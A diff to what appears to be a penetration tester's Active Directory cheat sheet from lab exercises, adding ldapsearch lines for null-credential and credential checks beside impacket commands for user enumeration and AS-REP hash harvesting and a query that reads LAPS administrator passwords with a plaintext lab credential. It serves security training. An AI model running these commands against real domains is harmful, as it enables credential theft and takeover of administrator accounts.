@@ -8,7 +8,10 @@ impacket-GetADUsers -all test.local/john:password123 -dc-ip 10.10.10.1
 impacket-GetNPUsers -dc-ip 10.10.65.161 spookysec.local/ -usersfile test -format john -outputfile hash.txt
 
 #Search user on ldpa
-ldapsearch -x -h 192.168.149.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
+    #Check null credentials
+    	ldapsearch -x -h 192.168.149.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
+    #check if creds is valid
+	ldapsearch -x -h <IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
 
 #When we have a valid cred, we can search admin password
 ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
